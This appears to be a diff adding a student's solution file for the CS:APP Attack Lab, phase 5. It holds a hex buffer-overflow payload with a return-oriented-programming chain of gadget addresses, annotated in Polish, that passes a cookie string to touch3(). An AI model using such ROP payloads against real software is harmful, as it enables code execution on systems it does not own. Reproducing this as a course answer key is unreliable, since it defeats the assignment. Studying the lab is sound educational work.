@@ -1,0 +1,27 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* mov %rsp, %rax w setval_445() */
+3a 1e 40 00 00 00 00 00
+/* mov %rax, %rdi w getval_124() */
+b9 1d 40 00 00 00 00 00
+/* pop %rax w getval_446() */
+ab 1d 40 00 00 00 00 00
+/* OFFSET */
+48 00 00 00 00 00 00 00
+/* mov %eax, %edx w getval_485() */
+53 1e 40 00 00 00 00 00
+/* mov %edx, %ecx w getval_224() */
+7b 1e 40 00 00 00 00 00 
+/* mov %ecx, %esi w addval_178() */
+b2 1e 40 00 00 00 00 00
+/* lea (%rdi, %rsi, 1), %rax w add_xy() */
+de 1d 40 00 00 00 00 00
+/* mov %rax, %rdi w getval_124() */
+b9 1d 40 00 00 00 00 00
+/* adres touch3() */
+10 1d 40 00 00 00 00 00
+/* cookie jako napis w ASCII */
+37 34 65 62 63 35 32 39
